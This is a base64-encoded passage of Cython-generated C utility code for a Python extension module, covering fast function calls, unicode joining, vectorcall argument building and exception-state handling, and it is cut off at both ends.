CNlbHNlCiAgICAjZGVmaW5lIF9fUHl4X1B5VmVjdG9yY2FsbF9GdW5jdGlvbihjYWxsYWJsZSkgUHlWZWN0b3JjYWxsX0Z1bmN0aW9uKGNhbGxhYmxlKQogICNlbmRpZgojZW5kaWYKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsRGljdChQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgX25hcmdzLCBQeU9iamVjdCAqa3dhcmdzKSB7CiAgICBQeV9zc2l6ZV90IG5hcmdzID0gX19QeXhfUHlWZWN0b3JjYWxsX05BUkdTKF9uYXJncyk7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04KICAgIGlmIChuYXJncyA9PSAwICYmIGt3YXJncyA9PSBOVUxMKSB7CiAgICAgICAgaWYgKF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9DaGVjayhmdW5jKSAmJiBsaWtlbHkoIF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9HRVRfRkxBR1MoZnVuYykgJiBNRVRIX05PQVJHUykpCiAgICAgICAgICAgIHJldHVybiBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aE8oZnVuYywgTlVMTCk7CiAgICB9CiAgICBlbHNlIGlmIChuYXJncyA9PSAxICYmIGt3YXJncyA9PSBOVUxMKSB7CiAgICAgICAgaWYgKF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9DaGVjayhmdW5jKSAmJiBsaWtlbHkoIF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9HRVRfRkxBR1MoZnVuYykgJiBNRVRIX08pKQogICAgICAgICAgICByZXR1cm4gX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhPKGZ1bmMsIGFyZ3NbMF0pOwogICAgfQojZW5kaWYKICAgICNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwODAwQjEKICAgICNpZiBDWVRIT05fRkFTVF9QWUNDQUxMCiAgICBpZiAoUHlDRnVuY3Rpb25fQ2hlY2soZnVuYykpIHsKICAgICAgICBpZiAoa3dhcmdzKSB7CiAgICAgICAgICAgIHJldHVybiBfUHlDRnVuY3Rpb25fRmFzdENhbGxEaWN0KGZ1bmMsIGFyZ3MsIG5hcmdzLCBrd2FyZ3MpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHJldHVybiBfUHlDRnVuY3Rpb25fRmFzdENhbGxLZXl3b3JkcyhmdW5jLCBhcmdzLCBuYXJncywgTlVMTCk7CiAgICAgICAgfQogICAgfQogICAgaWYgKCFrd2FyZ3MgJiYgX19QeXhfSVNfVFlQRShmdW5jLCAmUHlNZXRob2REZXNjcl9UeXBlKSkgewogICAgICAgIHJldHVybiBfUHlNZXRob2REZXNjcl9GYXN0Q2FsbEtleXdvcmRzKGZ1bmMsIGFyZ3MsIG5hcmdzLCBOVUxMKTsKICAgIH0KICAgICNlbmRpZgogICAgI2lmIENZVEhPTl9GQVNUX1BZQ0FMTAogICAgaWYgKFB5RnVuY3Rpb25fQ2hlY2soZnVuYykpIHsKICAgICAgICByZXR1cm4gX19QeXhfUHlGdW5jdGlvbl9GYXN0Q2FsbERpY3QoZnVuYywgYXJncywgbmFyZ3MsIGt3YXJncyk7CiAgICB9CiAgICAjZW5kaWYKICAgICNlbmRpZgogICAgaWYgKGt3YXJncyA9PSBOVUxMKSB7CiAgICAgICAgI2lmIENZVEhPTl9WRUNUT1JDQUxMICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICAgICAgdmVjdG9yY2FsbGZ1bmMgZiA9IF9fUHl4X1B5VmVjdG9yY2FsbF9GdW5jdGlvbihmdW5jKTsKICAgICAgICBpZiAoZikgewogICAgICAgICAgICByZXR1cm4gZihmdW5jLCBhcmdzLCBfbmFyZ3MsIE5VTEwpOwogICAgICAgIH0KICAgICAgICAjZWxpZiBkZWZpbmVkKF9fUHl4X0N5RnVuY3Rpb25fVVNFRCkgJiYgQ1lUSE9OX0JBQ0tQT1JUX1ZFQ1RPUkNBTEwKICAgICAgICBpZiAoX19QeXhfQ3lGdW5jdGlvbl9DaGVja0V4YWN0KGZ1bmMpKSB7CiAgICAgICAgICAgIF9fcHl4X3ZlY3RvcmNhbGxmdW5jIGYgPSBfX1B5eF9DeUZ1bmN0aW9uX2Z1bmNfdmVjdG9yY2FsbChmdW5jKTsKICAgICAgICAgICAgaWYgKGYpIHJldHVybiBmKGZ1bmMsIGFyZ3MsIF9uYXJncywgTlVMTCk7CiAgICAgICAgfQogICAgICAgICNlbGlmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgQ1lUSE9OX1ZFQ1RPUkNBTEwKICAgICAgICByZXR1cm4gUHlPYmplY3RfVmVjdG9yY2FsbChmdW5jLCBhcmdzLCBfbmFyZ3MsIE5VTEwpOwogICAgICAgICNlbmRpZgogICAgfQogICAgaWYgKG5hcmdzID09IDApIHsKICAgICAgICByZXR1cm4gX19QeXhfUHlPYmplY3RfQ2FsbChmdW5jLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV90dXBsZSwga3dhcmdzKTsKICAgIH0KICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMDAwICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICByZXR1cm4gUHlPYmplY3RfVmVjdG9yY2FsbERpY3QoZnVuYywgYXJncywgKHNpemVfdCluYXJncywga3dhcmdzKTsKICAgICNlbHNlCiAgICByZXR1cm4gX19QeXhfUHlPYmplY3RfRmFzdENhbGxfZmFsbGJhY2soZnVuYywgYXJncywgKHNpemVfdCluYXJncywga3dhcmdzKTsKICAgICNlbmRpZgp9CgoKc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9QeVVuaWNvZGVfSm9pbihQeU9iamVjdCoqIHZhbHVlcywgUHlfc3NpemVfdCB2YWx1ZV9jb3VudCwgUHlfc3NpemVfdCByZXN1bHRfdWxlbmd0aCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeV9VQ1M0IG1heF9jaGFyKSB7CiNpZiBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTICYmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgIUNZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTCiAgICBQeU9iamVjdCAqcmVzdWx0X3V2YWw7CiAgICBpbnQgcmVzdWx0X3VraW5kLCBraW5kX3NoaWZ0OwogICAgUHlfc3NpemVfdCBpLCBjaGFyX3BvczsKICAgIHZvaWQgKnJlc3VsdF91ZGF0YTsKICAgIGlmIChtYXhfY2hhciA+IDExMTQxMTEpIG1heF9jaGFyID0gMTExNDExMTsKICAgIHJlc3VsdF91dmFsID0gUHlVbmljb2RlX05ldyhyZXN1bHRfdWxlbmd0aCwgbWF4X2NoYXIpOwogICAgaWYgKHVubGlrZWx5KCFyZXN1bHRfdXZhbCkpIHJldHVybiBOVUxMOwogICAgcmVzdWx0X3VraW5kID0gKG1heF9jaGFyIDw9IDI1NSkgPyBQeVVuaWNvZGVfMUJZVEVfS0lORCA6IChtYXhfY2hhciA8PSA2NTUzNSkgPyBQeVVuaWNvZGVfMkJZVEVfS0lORCA6IFB5VW5pY29kZV80QllURV9LSU5EOwogICAga2luZF9zaGlmdCA9IChyZXN1bHRfdWtpbmQgPT0gUHlVbmljb2RlXzRCWVRFX0tJTkQpID8gMiA6IHJlc3VsdF91a2luZCAtIDE7CiAgICByZXN1bHRfdWRhdGEgPSBQeVVuaWNvZGVfREFUQShyZXN1bHRfdXZhbCk7CiAgICBhc3NlcnQoa2luZF9zaGlmdCA9PSAyIHx8IGtpbmRfc2hpZnQgPT0gMSB8fCBraW5kX3NoaWZ0ID09IDApOwogICAgaWYgKHVubGlrZWx5KChQWV9TU0laRV9UX01BWCA+PiBraW5kX3NoaWZ0KSAtIHJlc3VsdF91bGVuZ3RoIDwgMCkpCiAgICAgICAgZ290byBvdmVyZmxvdzsKICAgIGNoYXJfcG9zID0gMDsKICAgIGZvciAoaT0wOyBpIDwgdmFsdWVfY291bnQ7IGkrKykgewogICAgICAgIGludCB1a2luZDsKICAgICAgICBQeV9zc2l6ZV90IHVsZW5ndGg7CiAgICAgICAgdm9pZCAqdWRhdGE7CiAgICAgICAgUHlPYmplY3QgKnV2YWwgPSB2YWx1ZXNbaV07CiAgICAgICAgI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICAgICAgaWYgKF9fUHl4X1B5VW5pY29kZV9SRUFEWSh1dmFsKSA9PSAoLTEpKQogICAgICAgICAgICBnb3RvIGJhZDsKICAgICAgICAjZW5kaWYKICAgICAgICB1bGVuZ3RoID0gX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgodXZhbCk7CiAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgICAgIGlmICh1bmxpa2VseSh1bGVuZ3RoIDwgMCkpIGdvdG8gYmFkOwogICAgICAgICNlbmRpZgogICAgICAgIGlmICh1bmxpa2VseSghdWxlbmd0aCkpCiAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgIGlmICh1bmxpa2VseSgoUFlfU1NJWkVfVF9NQVggPj4ga2luZF9zaGlmdCkgLSB1bGVuZ3RoIDwgY2hhcl9wb3MpKQogICAgICAgICAgICBnb3RvIG92ZXJmbG93OwogICAgICAgIHVraW5kID0gX19QeXhfUHlVbmljb2RlX0tJTkQodXZhbCk7CiAgICAgICAgdWRhdGEgPSBfX1B5eF9QeVVuaWNvZGVfREFUQSh1dmFsKTsKICAgICAgICBpZiAodWtpbmQgPT0gcmVzdWx0X3VraW5kKSB7CiAgICAgICAgICAgIG1lbWNweSgoY2hhciAqKXJlc3VsdF91ZGF0YSArIChjaGFyX3BvcyA8PCBraW5kX3NoaWZ0KSwgdWRhdGEsIChzaXplX3QpICh1bGVuZ3RoIDw8IGtpbmRfc2hpZnQpKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMAogICAgICAgICAgICBpZiAodW5saWtlbHkoUHlVbmljb2RlX0NvcHlDaGFyYWN0ZXJzKHJlc3VsdF91dmFsLCBjaGFyX3BvcywgdXZhbCwgMCwgdWxlbmd0aCkgPCAwKSkgZ290byBiYWQ7CiAgICAgICAgICAgICNlbGlmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiB8fCBkZWZpbmVkKF9QeVVuaWNvZGVfRmFzdENvcHlDaGFyYWN0ZXJzKQogICAgICAgICAgICBfUHlVbmljb2RlX0Zhc3RDb3B5Q2hhcmFjdGVycyhyZXN1bHRfdXZhbCwgY2hhcl9wb3MsIHV2YWwsIDAsIHVsZW5ndGgpOwogICAgICAgICAgICAjZWxzZQogICAgICAgICAgICBQeV9zc2l6ZV90IGo7CiAgICAgICAgICAgIGZvciAoaj0wOyBqIDwgdWxlbmd0aDsgaisrKSB7CiAgICAgICAgICAgICAgICBQeV9VQ1M0IHVjaGFyID0gX19QeXhfUHlVbmljb2RlX1JFQUQodWtpbmQsIHVkYXRhLCBqKTsKICAgICAgICAgICAgICAgIF9fUHl4X1B5VW5pY29kZV9XUklURShyZXN1bHRfdWtpbmQsIHJlc3VsdF91ZGF0YSwgY2hhcl9wb3MraiwgdWNoYXIpOwogICAgICAgICAgICB9CiAgICAgICAgICAgICNlbmRpZgogICAgICAgIH0KICAgICAgICBjaGFyX3BvcyArPSB1bGVuZ3RoOwogICAgfQogICAgcmV0dXJuIHJlc3VsdF91dmFsOwpvdmVyZmxvdzoKICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19PdmVyZmxvd0Vycm9yLCAiam9pbigpIHJlc3VsdCBpcyB0b28gbG9uZyBmb3IgYSBQeXRob24gc3RyaW5nIik7CmJhZDoKICAgIFB5X0RFQ1JFRihyZXN1bHRfdXZhbCk7CiAgICByZXR1cm4gTlVMTDsKI2Vsc2UKICAgIFB5X3NzaXplX3QgaTsKICAgIFB5T2JqZWN0ICpyZXN1bHQgPSBOVUxMOwogICAgUHlPYmplY3QgKnZhbHVlX3R1cGxlID0gUHlUdXBsZV9OZXcodmFsdWVfY291bnQpOwogICAgaWYgKHVubGlrZWx5KCF2YWx1ZV90dXBsZSkpIHJldHVybiBOVUxMOwogICAgQ1lUSE9OX1VOVVNFRF9WQVIobWF4X2NoYXIpOwogICAgQ1lUSE9OX1VOVVNFRF9WQVIocmVzdWx0X3VsZW5ndGgpOwogICAgZm9yIChpPTA7IGk8dmFsdWVfY291bnQ7IGkrKykgewogICAgICAgIGlmIChfX1B5eF9QeVR1cGxlX1NFVF9JVEVNKHZhbHVlX3R1cGxlLCBpLCB2YWx1ZXNbaV0pICE9ICgwKSkgZ290byBiYWQ7CiAgICAgICAgUHlfSU5DUkVGKHZhbHVlc1tpXSk7CiAgICB9CiAgICByZXN1bHQgPSBQeVVuaWNvZGVfSm9pbihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlLCB2YWx1ZV90dXBsZSk7CmJhZDoKICAgIFB5X0RFQ1JFRih2YWx1ZV90dXBsZSk7CiAgICByZXR1cm4gcmVzdWx0OwojZW5kaWYKfQoKCiNpZiBDWVRIT05fVkVDVE9SQ0FMTApzdGF0aWMgaW50IF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhQeU9iamVjdCAqa2V5LCBQeU9iamVjdCAqdmFsdWUsIFB5T2JqZWN0ICpidWlsZGVyLCBQeU9iamVjdCAqKmFyZ3MsIGludCBuKSB7CiAgICAodm9pZClfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbERpY3Q7CiAgICBpZiAoX19QeXhfUHlUdXBsZV9TRVRfSVRFTShidWlsZGVyLCBuLCBrZXkpICE9ICgwKSkgcmV0dXJuIC0xOwogICAgUHlfSU5DUkVGKGtleSk7CiAgICBhcmdzW25dID0gdmFsdWU7CiAgICByZXR1cm4gMDsKfQpDWVRIT05fVU5VU0VEIHN0YXRpYyBpbnQgX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnX0NoZWNrKFB5T2JqZWN0ICprZXksIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKmJ1aWxkZXIsIFB5T2JqZWN0ICoqYXJncywgaW50IG4pIHsKICAgICh2b2lkKV9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZ1N0cjsKICAgIGlmICh1bmxpa2VseSghUHlVbmljb2RlX0NoZWNrKGtleSkpKSB7CiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvciwgImtleXdvcmRzIG11c3QgYmUgc3RyaW5ncyIpOwogICAgICAgIHJldHVybiAtMTsKICAgIH0KICAgIHJldHVybiBfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoa2V5LCB2YWx1ZSwgYnVpbGRlciwgYXJncywgbik7Cn0Kc3RhdGljIGludCBfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmdTdHIoY29uc3QgY2hhciAqa2V5LCBQeU9iamVjdCAqdmFsdWUsIFB5T2JqZWN0ICpidWlsZGVyLCBQeU9iamVjdCAqKmFyZ3MsIGludCBuKSB7CiAgICBQeU9iamVjdCAqcHlLZXkgPSBQeVVuaWNvZGVfRnJvbVN0cmluZyhrZXkpOwogICAgaWYgKCFweUtleSkgcmV0dXJuIC0xOwogICAgcmV0dXJuIF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhweUtleSwgdmFsdWUsIGJ1aWxkZXIsIGFyZ3MsIG4pOwp9CiNlbHNlIC8vIENZVEhPTl9WRUNUT1JDQUxMCkNZVEhPTl9VTlVTRUQgc3RhdGljIGludCBfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmdfQ2hlY2soUHlPYmplY3QgKmtleSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqYnVpbGRlciwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqKmFyZ3MsIENZVEhPTl9VTlVTRUQgaW50IG4pIHsKICAgIGlmICh1bmxpa2VseSghUHlVbmljb2RlX0NoZWNrKGtleSkpKSB7CiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvciwgImtleXdvcmRzIG11c3QgYmUgc3RyaW5ncyIpOwogICAgICAgIHJldHVybiAtMTsKICAgIH0KICAgIHJldHVybiBQeURpY3RfU2V0SXRlbShidWlsZGVyLCBrZXksIHZhbHVlKTsKfQojZW5kaWYKCgpzdGF0aWMgdm9pZCBfX1B5eF9SYWlzZVVuYm91bmRMb2NhbEVycm9yKGNvbnN0IGNoYXIgKnZhcm5hbWUpIHsKICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19VbmJvdW5kTG9jYWxFcnJvciwgImxvY2FsIHZhcmlhYmxlICclcycgcmVmZXJlbmNlZCBiZWZvcmUgYXNzaWdubWVudCIsIHZhcm5hbWUpOwp9CgoKc3RhdGljIHZvaWQgX19QeXhfUmFpc2VDbG9zdXJlTmFtZUVycm9yKGNvbnN0IGNoYXIgKnZhcm5hbWUpIHsKICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19OYW1lRXJyb3IsICJmcmVlIHZhcmlhYmxlICclcycgcmVmZXJlbmNlZCBiZWZvcmUgYXNzaWdubWVudCBpbiBlbmNsb3Npbmcgc2NvcGUiLCB2YXJuYW1lKTsKfQoKCiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUKc3RhdGljIGludCBfX1B5eF9fR2V0RXhjZXB0aW9uKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSwgUHlPYmplY3QgKip0eXBlLCBQeU9iamVjdCAqKnZhbHVlLCBQeU9iamVjdCAqKnRiKQojZWxzZQpzdGF0aWMgaW50IF9fUHl4X0dldEV4Y2VwdGlvbihQeU9iamVjdCAqKnR5cGUsIFB5T2JqZWN0ICoqdmFsdWUsIFB5T2JqZWN0ICoqdGIpCiNlbmRpZgp7CiAgICBQeU9iamVjdCAqbG9jYWxfdHlwZSA9IE5VTEwsICpsb2NhbF92YWx1ZSwgKmxvY2FsX3RiID0gTlVMTDsKI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURQogICAgUHlPYmplY3QgKnRtcF90eXBlLCAqdG1wX3ZhbHVlLCAqdG1wX3RiOwogICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwCiAgICBsb2NhbF92YWx1ZSA9IHRzdGF0ZS0+Y3VycmVudF9leGNlcHRpb247CiAgICB0c3RhdGUtPmN1cnJlbnRfZXhjZXB0aW9uID0gMDsKICAjZWxzZQogICAgbG9jYWxfdHlwZSA9IHRzdGF0ZS0+Y3VyZXhjX3R5cGU7CiAgICBsb2NhbF92YWx1ZSA9IHRzdGF0ZS0+Y3VyZXhjX3ZhbHVlOwogICAgbG9jYWxfdGIgPSB0c3RhdGUtPmN1cmV4Y190cmFjZWJhY2s7CiAgICB0c3RhdGUtPmN1cmV4Y190eXBlID0gMDsKICAgIHRzdGF0ZS0+Y3VyZXhjX3ZhbHVlID0gMDsKICAgIHRzdGF0ZS0+Y3VyZXhjX3RyYWNlYmFjayA9IDA7CiAgI2VuZGlmCiNlbGlmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPiAweDAzMEMwMDAwCiAgICBsb2NhbF92YWx1ZSA9IFB5RXJyX0dldFJhaXNlZEV4Y2VwdGlvbigpOwojZWxzZQogICAgUHlFcnJfRmV0Y2goJmxvY2FsX3R5cGUsICZsb2NhbF92YWx1ZSwgJmxvY2FsX3RiKTsKI2VuZGlmCiNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID4gMHgwMzBDMDAwMAogICAgaWYgKGxpa2VseShsb2NhbF92YWx1ZSkpIHsKICAgICAgICBsb2NhbF90eXBlID0gKFB5T2JqZWN0KikgUHlfVFlQRShsb2NhbF92YWx1ZSk7CiAgICAgICAgUHlfSU5DUkVGKGxvY2FsX3R5cGUpOwogICAgICAgIGxvY2FsX3RiID0gUHlFeGNlcHRpb25fR2V0VHJhY2ViYWNrKGxvY2FsX3ZhbHVlKTsKICAgIH0KI2Vsc2UKICAgIFB5RXJyX05vcm1hbGl6ZUV4Y2VwdGlvbigmbG9jYWxfdHlwZSwgJmxvY2FsX3ZhbHVlLCAmbG9jYWxfdGIpOwojaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFCiAgICBpZiAodW5saWtlbHkodHN0YXRlLT5jdXJleGNfdHlwZSkpCiNlbHNlCiAgICBpZiAodW5saWtlbHkoUHlFcnJfT2NjdXJyZWQoKSkpCiNlbmRpZgogICAgICAgIGdvdG8gYmFkOwogICAgaWYgKGxvY2FsX3RiKSB7CiAgICAgICAgaWYgKHVubGlrZWx5KFB5RXhjZXB0aW9uX1NldFRyYWNlYmFjayhsb2NhbF92YWx1ZSwgbG9jYWxfdGIpIDwgMCkpCiAgICAgICAgICAgIGdvdG8gYmFkOwogICAgfQojZW5kaWYgLy8gX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+IDB4MDMwQzAwMDAKICAgIFB5X1hJTkNSRUYobG9jYWxfdGIpOwogICAgUHlfWElOQ1JFRihsb2NhbF90eXBlKTsKICAgIFB5X1hJTkNSRUYobG9jYWxfdmFsdWUpOwogICAgKnR5cGUgPSBsb2NhbF90eXBlOwogICAgKnZhbHVlID0gbG9jYWxfdmFsdWU7CiAgICAqdGIgPSBsb2NhbF90YjsKI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURQogICAgI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sKICAgIHsKICAgICAgICBfUHlFcnJfU3RhY2tJdGVtICpleGNfaW5mbyA9IHRzdGF0ZS0+ZXhjX2luZm87CiAgICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMGE0CiAgICAgICAgdG1wX3ZhbHVlID0gZXhjX2luZm8tPmV4Y192YWx1ZTsKICAgICAgICBleGNfaW5mby0+ZXhjX3ZhbHVlID0gbG9jYWxfdmFsdWU7CiAgICAgICAgdG1wX3R5cGUgPSBOVUxMOwogICAgICAgIHRtcF90YiA9IE5VTEw7CiAgICAgICAgUHlfWERFQ1JFRihsb2NhbF90eXBlKTsKICAgICAgICBQeV9YREVDUkVGKGxvY2FsX3RiKTsKICAgICAgI2Vsc2UKICAgICAgICB0bXBfdHlwZSA9IGV4Y19pbmZvLT5leGNfdHlwZTsKICAgICAgICB0bXBfdmFsdWUgPSBleGNfaW5mby0+ZXhjX3ZhbHVlOwogICAgICAgIHRtcF90YiA9IGV4Y19pbmZvLT5leGNfdHJhY2ViYWNrOwogICAgICAgIGV4Y19pbmZvLT5leGNfdHlwZSA9IGxvY2FsX3R5cGU7CiAgICAgICAgZXhjX2luZm8tPmV4Y192YWx1ZSA9IGxvY2FsX3ZhbHVlOwogICAgICAgIGV4Y19pbmZvLT5leGNfdHJhY2ViYWNrID0gbG9jYWxfdGI7CiAgICAgICNlbmRpZgogICAgfQogICAgI2Vsc2UKICAgIHRtcF90eXBlID0gdHN0YXRlLT5leGNfdHlwZTsKICAgIHRtcF92YWx1ZSA9IHRzdGF0ZS0+ZXhjX3ZhbHVlOwogICAgdG1wX3RiID0gdHN0YXRlLT5leGNfdHJhY2ViYWNrOwogICAgdHN0YXRlLT5leGNfdHlwZSA9IGxvY2FsX3R5cGU7CiAgICB0c3RhdGUtPmV4Y192YWx1ZSA9IGxvY2FsX3ZhbHVlOwogICAgdHN0YXRlLT5leGNfdHJhY2ViYWNrID0gbG9jYWxfdGI7CiAgICAjZW5kaWYKICAgIFB5X1hERUNSRUYodG1wX3R5cGUpOwogICAgUHlfWERFQ1JFRih0bXBfdmFsdWUpOwogICAgUHlfWERFQ1JFRih0bXBfdGIpOwojZWxpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwYjAwMDAKICAgIFB5RXJyX1NldEhhbmRsZWRFeGNlcHRpb24obG9jYWxfdmFsdWUpOwogICAgUHlfWERFQ1JFRihsb2NhbF92YWx1ZSk7CiAgICBQeV9YREVDUkVGKGxvY2FsX3R5cGUpOwogICAgUHlfWERFQ1JFRihsb2NhbF90Yik7CiNlbHNlCiAgICBQeUVycl9TZXRFeGNJbmZvKGxvY2FsX3R5cGUsIGxvY2FsX3ZhbHVlLCBsb2NhbF90Yik7CiNlbmRpZgogICAgcmV0dXJuIDA7CiNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDw9IDB4MDMwQzAwMDAKYmFkOgogICAgKnR5cGUgPSAwOwogICAgKnZhbHVlID0gMDsKICAgICp0YiA9IDA7CiAgICBQeV9YREVDUkVGKGxvY2FsX3R5cGUpOwogICAgUHlfWERFQ1JFRihsb2NhbF92YWx1ZSk7CiAgICBQeV9YREVDUkVGKGxvY2FsX3RiKTsKICAgIHJldHVybiAtMTsKI2VuZGlmCn0KCgpzdGF0aWMgdm9pZCBfX1B5eF9HZW5lcmF0b3JfUmVwbGFjZV9TdG9wSXRlcmF0aW9uKGludCBpbl9hc3luY19nZW4pIHsKICAgIFB5T2JqZWN0ICpleGMsICp2YWwsICp0YiwgKmN1cl9leGMsICpuZXdfZXhjOwogICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlCiAgICBpbnQgaXNfYXN5bmNfc3RvcGl0ZXJhdGlvbiA9IDA7CiAgICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUihpbl9hc3luY19nZW4pOwogICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KICAgIGN1cl9leGMgPSBfX1B5eF9QeUVycl9DdXJyZW50RXhjZXB0aW9uVHlwZSgpOwogICAgaWYgKGxpa2VseSghX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGN1cl9leGMsIFB5RXhjX1N0b3BJdGVyYXRpb24pKSkgewogICAgICAgIGlmIChpbl9hc3luY19nZW4gJiYgdW5saWtlbHkoX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGN1cl9leGMsIFB5RXhjX1N0b3BBc3luY0l0ZXJhdGlvbikpKSB7CiAgICAgICAgICAgIGlzX2FzeW5jX3N0b3BpdGVyYXRpb24gPSAxOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CiAgICB9CiAgICBfX1B5eF9HZXRFeGNlcHRpb24oJmV4YywgJnZhbCwgJnRiKTsKICAgIFB5X1hERUNSRUYoZXhjKTsKICAgIFB5X1hERUNSRUYodGIpOwogICAgbmV3X2V4YyA9IFB5T2JqZWN0X0NhbGxGdW5jdGlvbihQeUV4Y19SdW50aW1lRXJyb3IsICJzIiwKICAgICAgICBpc19hc3luY19zdG9waXRlcmF0aW9uID8gImFzeW5jIGdlbmVyYXRvciByYWlzZWQgU3RvcEFzeW5jSXRlcmF0aW9uIiA6CiAgICAgICAgaW5fYXN5bmNfZ2VuID8gImFzeW5jIGdlbmVyYXRvciByYWlzZWQgU3RvcEl0ZXJhdGlvbiIgOgogICAgICAgICJnZW5lcmF0b3IgcmFpc2VkIFN0b3BJdGVyYXRpb24iKTsKICAgIGlmICghbmV3X2V4YykgewogICAgICAgIFB5X1hERUNSRUYodmFsKTsKICAgICAgICByZXR1cm47CiAgICB9CiAgICBQeUV4Y2VwdGlvbl9TZXRDYXVzZShuZXdfZXhjLCB2YWwpOyAvLyBzdGVhbHMgcmVmIHRvIHZhbAogICAgUHlFcnJfU2V0T2JqZWN0KFB5RXhjX1J1bnRpbWVFcnJvciwgbmV3X2V4Yyk7Cn0KCgojaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWQpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5RGljdF9HZXRJdGVtKFB5T2JqZWN0ICpkLCBQeU9iamVjdCoga2V5KSB7CiAgICBQeU9iamVjdCAqdmFsdWU7CiAgICBpZiAodW5saWtlbHkoX19QeXhfUHlEaWN0X0dldEl0ZW1SZWYoZCwga2V5LCAmdmFsdWUpID09IDApKSB7IC8vIG5vIHZhbHVlLCBubyBlcnJvcgogICAgICAgIGlmICh1bmxpa2VseShQeVR1cGxlX0NoZWNrKGtleSkpKSB7CiAgICAgICAgICAgIFB5T2JqZWN0KiBhcmdzID0gUHlUdXBsZV9QYWNrKDEsIGtleSk7CiAgICAgICAgICAgIGlmIChsaWtlbHkoYXJncykpIHsKICAgICAgICAgICAgICAgIFB5RXJyX1NldE9iamVjdChQeUV4Y19LZXlFcnJvciwgYXJncyk7CiAgICAgICAgICAgICAgICBQeV9ERUNSRUYoYXJncyk7CiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBQeUVycl9TZXRPYmplY3QoUHlFeGNfS2V5RXJyb3IsIGtleSk7CiAgICAgICAgfQogICAgfQogICAgcmV0dXJuIHZhbHVlOwp9CiNlbmRpZgoKCiMgaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCnN0YXRpYyBpbnQKX19QeXhfdW5pY29kZV9tb2RpZmlhYmxlKFB5T2JqZWN0ICp1bmljb2RlKQp7CiAgICBpZiAoUHlfUkVGQ05UKHVuaWNvZGUpICE9IDEpCiAgICAg